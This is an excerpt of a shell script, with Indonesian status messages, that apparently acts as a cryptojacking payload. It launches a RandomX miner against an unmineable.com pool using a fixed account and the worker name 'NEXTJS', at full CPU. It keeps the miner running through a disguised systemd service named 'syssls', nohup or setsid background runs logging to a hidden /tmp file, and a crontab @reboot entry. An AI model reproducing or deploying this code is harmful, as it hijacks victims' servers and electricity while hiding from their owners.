...
echo "IP yang digunakan (dengan tanda hubung): $IP_TO_USE (NEXTJS)"
...
Restart=on-failure
RestartSec=15s
ExecStart=$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.NEXTJS --cpu-max-threads-hint=100
...
WantedBy=multi-user.target" > /etc/systemd/system/syssls.service
        ...
        echo "Worker : VPS-NEXTJS"
    else
        if command -v nohup >/dev/null 2>&1; then
            nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.NEXTJS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
            echo "Menjalankan miner dengan nohup."
            echo "Worker : NEXTJS"
        elif command -v setsid >/dev/null 2>&1; then
            setsid $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.NEXTJS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
            echo "Menjalankan miner dengan setsid."
        else
            crontab -l | { cat; echo "@reboot $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.NEXTJS --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &"; } | crontab -
